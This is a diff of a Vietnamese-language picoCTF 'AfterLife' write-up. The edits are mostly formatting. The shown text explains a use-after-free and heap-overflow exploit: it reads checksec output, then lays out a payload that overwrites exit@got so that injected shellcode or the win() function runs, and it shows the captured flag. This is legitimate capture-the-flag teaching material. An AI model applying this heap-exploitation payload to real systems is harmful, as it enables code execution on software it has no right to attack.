@@ -1,12 +1,12 @@
 ## PWN - AfterLife (400)
 
-#### Description
+### Description
 > Just pwn this [program](vuln) and get a flag. It's also found in /problems/afterlife_4_1753231287c321c4b5b1102d1b2272c6 on the shell server. [Source](vuln.c)
 
-#### Hints
+### Hints
 > If you understood the double free, a use after free should not be hard! http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
 
-#### Examination
+### Examination
 Ở đây ta có 1 hàm win() để đọc flag, 1 hàm main() bao gồm nhiều lệnh malloc() và free(). Đây rõ ràng là một bài về Heap exploitation. Mục tiêu là gọi được hàm win().
 Trước hết cứ thử chạy chương trình đã:
 ```bash
@@ -32,17 +32,17 @@ pwndbg> checksec
 ```
 Hãy phân tích một chút:
 - Đây là một binary 32bit. Các ô nhớ sẽ có độ dài 4 bytes.
-- Canary found, vậy nếu ta muốn overflow lên stack thì sẽ phải leak được canary. Nếu không chương trình sẽ crash.
-- RELRO: Partial. Nghĩa là vùng GOT chứa địa chỉ các hàm trong libc có thể ghi đè được.
-- NX (non-executable) nếu được bật nghĩa là sẽ không có vùng nhớ nào vừa có quyền writeable, vừa có quyền executable. Nói cách khác, nếu user chèn shellcode vào Heap hay Stack thì cũng không thể thực thi shellcode. Bài này có NX disabled, nhiều khả năng sẽ được giải quyết bằng cách chèn shellcode.
-- NO PIE (Position Independent Executable) nghĩa là khi chương trình được load lên, địa chỉ của các hàm trong chương trình sẽ không đổi, như vậy exploit sẽ dễ dàng hơn.
-- Một điều cần lưu ý là trên server của pico thì ASLR (Address space layout randomization) được bật. Nghĩa là mỗi khi load 1 binary lên, địa chỉ các phân vùng bộ nhớ như Heap, Stack, thư viện chia sẽ shared library sẽ thay đổi. Điều này sẽ làm khó cho attacker trong quá trình exploit. Để check trạng thái ASLR ta dùng lệnh (2 là On, 0 là Off):
+- **Canary found**, vậy nếu ta muốn overflow lên stack thì sẽ phải leak được canary. Nếu không chương trình sẽ crash.
+- **RELRO: Partial**. Nghĩa là vùng GOT chứa địa chỉ các hàm trong libc có thể ghi đè được.
+- **NX (non-executable)** nếu được bật nghĩa là sẽ không có vùng nhớ nào vừa có quyền writeable, vừa có quyền executable. Nói cách khác, nếu user chèn shellcode vào Heap hay Stack thì cũng không thể thực thi shellcode. Bài này có NX disabled, nhiều khả năng sẽ được giải quyết bằng cách chèn shellcode.
+- **NO PIE (Position Independent Executable)** nghĩa là khi chương trình được load lên, địa chỉ của các hàm trong chương trình sẽ không đổi, như vậy exploit sẽ dễ dàng hơn.
+- Một điều cần lưu ý là trên server của pico thì **ASLR (Address space layout randomization)** được bật. Nghĩa là mỗi khi load 1 binary lên, địa chỉ các phân vùng bộ nhớ như Heap, Stack, thư viện chia sẽ shared library sẽ thay đổi. Điều này sẽ làm khó cho attacker trong quá trình exploit. Để check trạng thái ASLR ta dùng lệnh sau (2 là On, 0 là Off):
 ```bash
 RootHunter@pico-2019-shell1:/problems/afterlife_4_1753231287c321c4b5b1102d1b2272c6$ cat /proc/sys/kernel/randomize_va_space
 2
 ```
 
-#### Bugs
+### Bugs
 Sau khi phân tích sơ bộ chương trình, giờ ta sẽ đi vào đọc source code để tìm lỗi:
 ```c
 int main(int argc, char *argv[])
@@ -73,7 +73,7 @@ Nếu đã từng làm việc với Heap Exploitation, bạn sẽ nhận ra ngay
 Biến con trỏ `first` sau khi đã free() vẫn được sử dụng lại. Ngoài ra, dòng này còn dính lỗi **Heap Overflow** khi không ràng buộc độ dài buffer truyền vào `first`. Nhưng thấy lỗi là một chuyện, làm sao để khai thác nó lại là một chuyện khác.
 Để hiểu được flow của chương trình cách tốt nhất là dùng một công cụ debug, tôi hay dùng [pwndbg](https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md) để làm những bài về Heap.
 
-#### Prepare enviroment
+### Prepare enviroment
 Có một điều cần lưu ý là server pico sử dụng thư viện libc phiên bản 2.27:
 ```bash
 RootHunter@pico-2019-shell1:/problems/afterlife_4_1753231287c321c4b5b1102d1b2272c6$ ldd vuln
@@ -86,7 +86,7 @@ lrwxrwxrwx 1 root root 12 Apr 16  2018 /lib32/libc.so.6 -> libc-2.27.so
 Do đó nếu bạn đang dùng hệ điều hành mới hơn với glibc version khác thì nhiều khi bạn debug trên máy được nhưng khi lên server lại thọt một cách đau đớn (tôi dùng Kali linux và phiên bản libc trên máy là 2.29). Vì các phiên bản glibc mới hơn sẽ có các đặc điểm cấp phát bộ nhớ khác hơn phiên bản cũ. Libc từ phiên bản 2.26 trở lên đã giới thiệu thêm một loại bin khác, đó là tcache bin, giúp cải thiện tốc độ cấp phát và giải phóng bộ nhớ.
 Để có thể sử dụng đúng phiên bản libc như server, tôi sẽ sử dụng 1 docker của tác giả [skysider](https://github.com/skysider/pwndocker) modified từ Ubuntu 18.04 với nhiều phiên bản libc được cài sẵn. Cài đặt cũng khá dễ dàng.
 
-#### Debug
+### Debug
 ```bash
 pwndbg> disass main
 Dump of assembler code for function main:
@@ -387,7 +387,7 @@ Tại vị trí leak + 8 ta sẽ chèn shellcode vào. Như vậy khi gặp lệ
 
 Tuy nhiên có 1 vấn đề nho nhỏ (nhưng không nhỏ) là 4 bytes tại vị trí leak + 16 cũng sẽ bị ghi đè do `bk + 8 = fd`. Vì vậy sẽ làm hỏng shellcode của ta. 
 
-Để bypass điều này, ta sẽ xây dựng shell code như sau:
+Để bypass điều này, ta sẽ xây dựng payload như sau:
 ```
 exit@got - 12
 leak + 8
@@ -400,7 +400,7 @@ shellcode
 ```
 Như vậy, cho dù 4 bytes ở giữa dãy `nop` có bị thay đổi, ta vẫn nhảy đến được shellcode.
 
-#### Exploit
+### Exploit
 [Source exploit](ex.py)
 
 ```bash
@@ -440,7 +440,7 @@ picoCTF{what5_Aft3r_e274134c}$
 
 ```
 
-#### Bonus
+### Bonus
 Vì bài này chỉ cần gọi hàm win() là đủ. Thay vì gọi shellcode để lấy shell,
 ta có nhiều cách khác để khắc phụ vụ 4 bytes bị corrupt, chẳng hạn như payload sau:
 ```
@@ -454,6 +454,6 @@ Trong đó **0x08048966** là địa chỉ hàm win(). Hoặc:
 exit@got - 12
 leak + 8
 asm("mov edi, 0x08048966")
-asm("call 0x08048966")
+asm("call edi")
 ```
-Chỉ cần đoạn assembly <= 8 bytes thì sẽ không bị corrupt. Cần chú ý là shellcode không được chứa *0x0a* vì nó là ký tự kết thúc cho hàm `gets()` và shellcode sẽ không được inject hết vào heap.
+Chỉ cần đoạn assembly <= 8 bytes thì sẽ không bị corrupt. Cần chú ý là shellcode không được chứa *0x0a* vì nó là ký tự kết thúc cho hàm `gets()` và payload sẽ không được inject hết vào heap.
